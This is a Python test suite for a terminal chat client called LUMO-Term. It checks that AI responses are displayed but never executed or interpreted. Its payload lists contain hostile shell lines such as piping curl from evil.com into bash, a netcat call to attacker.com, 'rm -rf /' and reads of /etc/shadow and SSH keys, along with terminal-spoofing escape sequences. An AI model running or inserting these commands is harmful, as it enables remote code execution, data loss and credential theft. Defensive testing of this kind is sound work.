"""Security tests for command injection and response sanitization.

These tests verify that LUMO-Term is resistant to various injection attacks
that could occur if LUMO's AI responses contained malicious content.

Attack vectors tested:
1. Shell command injection (backticks, $(), etc.)
2. ANSI escape sequence attacks
3. Rich markup injection
4. Terminal escape sequences
5. Path traversal attempts
"""

import pytest
from unittest.mock import Mock, AsyncMock, patch
from io import StringIO

from lumo_term.cli import run_repl, run_single_message


# ============================================================================
# Test Data: Malicious Payloads
# ============================================================================

SHELL_INJECTION_PAYLOADS = [
    # Backtick command substitution
    "Here's a tip: `rm -rf /`",
    "Try running `cat /etc/passwd`",

    # $() command substitution
    "Use $(whoami) to find your username",
    "The result is $(curl evil.com/malware.sh | bash)",

    # Pipe injection
    "Type this: | nc attacker.com 4444",
    "echo test | cat /etc/shadow",

    # Semicolon command chaining
    "Do this; rm -rf ~/*",
    "ls; curl evil.com | sh",

    # && and || chaining
    "true && rm -rf /",
    "false || wget evil.com/script.sh",

    # Newline injection
    "First line\nrm -rf /\nSecond line",
    "Test\n`malicious command`\nEnd",
]

ANSI_ESCAPE_PAYLOADS = [
    # Clear screen
    "\x1b[2J\x1b[HYou've been pwned",

    # Cursor manipulation
    "\x1b[100A\x1b[2KFake prompt: ",

    # Color manipulation
    "\x1b[31m\x1b[1mCRITICAL ERROR\x1b[0m",

    # Hyperlink escape sequence (OSC 8)
    "\x1b]8;;http://evil.com\x07Click here\x1b]8;;\x07",

    # Terminal title manipulation (OSC 0)
    "\x1b]0;You've been hacked\x07",

    # Alternate screen buffer
    "\x1b[?1049h\x1b[2JFake login: ",
]

RICH_MARKUP_PAYLOADS = [
    # Rich markup injection
    "[bold red]FAKE ERROR[/bold red]",
    "[link=http://evil.com]Click here[/link]",
    "[blink]URGENT[/blink]",

    # Console markup bypass attempts
    "[[double brackets]]",
    "[/]reset attempt[/]",
]

PATH_TRAVERSAL_PAYLOADS = [
    # Path traversal in responses
    "Save to ../../etc/passwd",
    "File: /etc/shadow",
    "../../../home/user/.ssh/id_rsa",
]


# ============================================================================
# Shell Injection Tests
# ============================================================================

class TestShellInjectionDefense:
    """Verify shell commands in responses are NOT executed."""

    @pytest.mark.asyncio
    @pytest.mark.parametrize("payload", SHELL_INJECTION_PAYLOADS)
    async def test_shell_injection_not_executed(self, payload):
        """Response containing shell commands should be displayed, not executed."""
        mock_client = AsyncMock()
        mock_client.send_message = AsyncMock(return_value=payload)

        executed_commands = []

        # Patch subprocess and os to detect any execution attempts
        with patch("subprocess.run", side_effect=lambda *a, **k: executed_commands.append(("subprocess.run", a))):
            with patch("subprocess.Popen", side_effect=lambda *a, **k: executed_commands.append(("Popen", a))):
                with patch("os.system", side_effect=lambda *a: executed_commands.append(("os.system", a))):
                    with patch("lumo_term.cli.console") as mock_console:
                        await run_single_message(mock_client, "test")

        # No commands should have been executed
        assert len(executed_commands) == 0, f"Commands were executed: {executed_commands}"

        # The response should have been printed
        mock_console.print.assert_called()

    @pytest.mark.asyncio
    async def test_backtick_in_response_is_safe(self):
        """Backticks in response should be displayed as text."""
        mock_client = AsyncMock()
        mock_client.send_message = AsyncMock(return_value="Run `ls -la` to list files")

        printed_content = []
        mock_console = Mock()
        mock_console.print = Mock(side_effect=lambda *a, **k: printed_content.append(str(a)))

        with patch("lumo_term.cli.console", mock_console):
            await run_single_message(mock_client, "test")

        # Should contain the backticks as literal text
        output = " ".join(printed_content)
        assert "ls -la" in output or "Markdown" in output


# ============================================================================
# ANSI Escape Sequence Tests
# ============================================================================

class TestANSIEscapeDefense:
    """Verify ANSI escape sequences are handled safely."""

    @pytest.mark.asyncio
    @pytest.mark.parametrize("payload", ANSI_ESCAPE_PAYLOADS)
    async def test_ansi_escapes_in_streaming(self, payload):
        """ANSI escape sequences in streaming responses should be sanitized or escaped."""
        mock_client = AsyncMock()
        streamed_tokens = []

        async def mock_send(msg, on_token=None):
            if on_token:
                # Simulate streaming the malicious payload
                for char in payload:
                    on_token(char)
                    streamed_tokens.append(char)
            return payload

        mock_client.send_message = mock_send

        # Capture what gets printed
        printed_output = []
        mock_console = Mock()
        mock_console.print = Mock(side_effect=lambda *a, **k: printed_output.append((a, k)))

        with patch("lumo_term.cli.Prompt.ask", side_effect=["test", "/quit"]):
            with patch("lumo_term.cli.console", mock_console):
                await run_repl(mock_client)

        # Verify markup=False is used for streaming output
        # This ensures Rich doesn't interpret any escape sequences
        for args, kwargs in printed_output:
            if kwargs.get("end") == "":
                # This is streaming output - should have markup=False
                assert kwargs.get("markup") == False or kwargs.get("markup") is False, \
                    "Streaming output should use markup=False"


# ============================================================================
# Rich Markup Injection Tests
# ============================================================================

class TestRichMarkupDefense:
    """Verify Rich markup in responses doesn't affect display incorrectly."""

    @pytest.mark.asyncio
    @pytest.mark.parametrize("payload", RICH_MARKUP_PAYLOADS)
    async def test_rich_markup_in_streaming_is_literal(self, payload):
        """Rich markup in streaming should be displayed as literal text."""
        mock_client = AsyncMock()

        async def mock_send(msg, on_token=None):
            if on_token:
                on_token(payload)
            return payload

        mock_client.send_message = mock_send

        printed_calls = []
        mock_console = Mock()
        mock_console.print = Mock(side_effect=lambda *a, **k: printed_calls.append((a, k)))

        with patch("lumo_term.cli.Prompt.ask", side_effect=["test", "/quit"]):
            with patch("lumo_term.cli.console", mock_console):
                await run_repl(mock_client)

        # Streaming calls should have markup=False
        streaming_calls = [(a, k) for a, k in printed_calls if k.get("end") == ""]
        for args, kwargs in streaming_calls:
            assert kwargs.get("markup") == False


# ============================================================================
# Response Content Safety Tests
# ============================================================================

class TestResponseContentSafety:
    """Test that response content is treated as display-only data."""

    @pytest.mark.asyncio
    async def test_response_not_evaluated(self):
        """Response should never be eval'd or exec'd."""
        mock_client = AsyncMock()
        mock_client.send_message = AsyncMock(return_value="__import__('os').system('evil')")

        eval_calls = []
        exec_calls = []

        original_eval = eval
        original_exec = exec

        with patch("builtins.eval", side_effect=lambda *a: eval_calls.append(a)):
            with patch("builtins.exec", side_effect=lambda *a: exec_calls.append(a)):
                with patch("lumo_term.cli.console"):
                    await run_single_message(mock_client, "test")

        # No eval or exec should be called on response content
        assert len(eval_calls) == 0, f"eval was called: {eval_calls}"
        assert len(exec_calls) == 0, f"exec was called: {exec_calls}"

    @pytest.mark.asyncio
    async def test_response_not_used_as_path(self):
        """Response content should not be used for file operations."""
        mock_client = AsyncMock()
        mock_client.send_message = AsyncMock(return_value="/etc/passwd")

        file_operations = []

        with patch("builtins.open", side_effect=lambda *a, **k: file_operations.append(("open", a))):
            with patch("pathlib.Path.read_text", side_effect=lambda *a: file_operations.append(("read", a))):
                with patch("lumo_term.cli.console"):
                    await run_single_message(mock_client, "test")

        # No file operations on response content
        for op, args in file_operations:
            if args:
                assert "/etc/passwd" not in str(args), f"Response used as path: {op} {args}"


# ============================================================================
# Integration Security Tests
# ============================================================================

class TestIntegrationSecurity:
    """Integration tests for security properties."""

    @pytest.mark.asyncio
    async def test_full_repl_session_is_safe(self):
        """A full REPL session with malicious responses should be safe."""
        mock_client = AsyncMock()
        mock_client.new_conversation = AsyncMock()

        # Each "response" contains a different attack vector
        attack_responses = iter([
            "`rm -rf /`",
            "$(curl evil.com | bash)",
            "\x1b[2J\x1b[HHacked!",
            "[bold red]FAKE ERROR[/bold red]",
            "Done.",
        ])

        mock_client.send_message = AsyncMock(side_effect=lambda *a, **k: next(attack_responses))

        commands_executed = []

        with patch("subprocess.run", side_effect=lambda *a, **k: commands_executed.append(a)):
            with patch("os.system", side_effect=lambda *a: commands_executed.append(a)):
                with patch("lumo_term.cli.Prompt.ask", side_effect=[
                    "msg1", "msg2", "msg3", "msg4", "msg5", "/quit"
                ]):
                    with patch("lumo_term.cli.console"):
                        await run_repl(mock_client)

        # No commands should have been executed despite malicious responses
        assert len(commands_executed) == 0

    @pytest.mark.asyncio
    async def test_empty_response_handling(self):
        """Empty or None responses should be handled safely."""
        mock_client = AsyncMock()
        mock_client.send_message = AsyncMock(return_value="")

        with patch("lumo_term.cli.console") as mock_console:
            await run_single_message(mock_client, "test")

        # Should not crash
        mock_console.print.assert_called()

    @pytest.mark.asyncio
    async def test_extremely_long_response(self):
        """Very long responses should not cause resource exhaustion."""
        mock_client = AsyncMock()
        # 10MB response
        huge_response = "A" * (10 * 1024 * 1024)
        mock_client.send_message = AsyncMock(return_value=huge_response)

        with patch("lumo_term.cli.console"):
            # Should complete without memory error
            await run_single_message(mock_client, "test")


# ============================================================================
# User Input Sanitization Tests
# ============================================================================

class TestUserInputSafety:
    """Verify user input is handled safely."""

    @pytest.mark.asyncio
    async def test_user_input_not_executed(self):
        """User input should only be sent to LUMO, never executed locally."""
        mock_client = AsyncMock()
        mock_client.send_message = AsyncMock(return_value="OK")

        malicious_input = "test; rm -rf /"

        executed = []

        with patch("subprocess.run", side_effect=lambda *a, **k: executed.append(a)):
            with patch("os.system", side_effect=lambda *a: executed.append(a)):
                with patch("lumo_term.cli.console"):
                    await run_single_message(mock_client, malicious_input)

        # User input should have been passed to LUMO, not executed
        mock_client.send_message.assert_called_once_with(malicious_input)
        assert len(executed) == 0
